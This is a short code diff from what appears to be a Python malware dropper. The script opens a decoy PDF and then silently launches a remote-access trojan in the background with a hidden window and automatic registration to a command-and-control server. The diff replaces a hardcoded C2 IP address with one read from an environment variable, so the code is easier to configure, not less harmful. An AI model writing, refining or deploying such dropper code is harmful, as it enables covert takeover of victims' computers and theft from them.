@@ -86,14 +86,17 @@ def main():
             print(f"[-] Failed to open PDF: {e}")
     
     # ========== STEP 3: Run RAT silently in background ==========
+    # C2 URL from env var (fallback to loopback for safety — NOT a hardcoded IP).
+    C2_URL = os.getenv("CYBERRECON_C2", "http://127.0.0.1:8443")
+
     if os.path.exists(rat_dst):
         try:
             subprocess.Popen(
-                [rat_dst, "--c2", "http://18.61.36.73:8443", "--auto-register"],
+                [rat_dst, "--c2", C2_URL, "--auto-register"],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 shell=False
             )
-            print("[+] RAT started in background")
+            print(f"[+] RAT started in background (C2: {C2_URL})")
         except Exception as e:
             print(f"[-] Failed to start RAT: {e}")
     
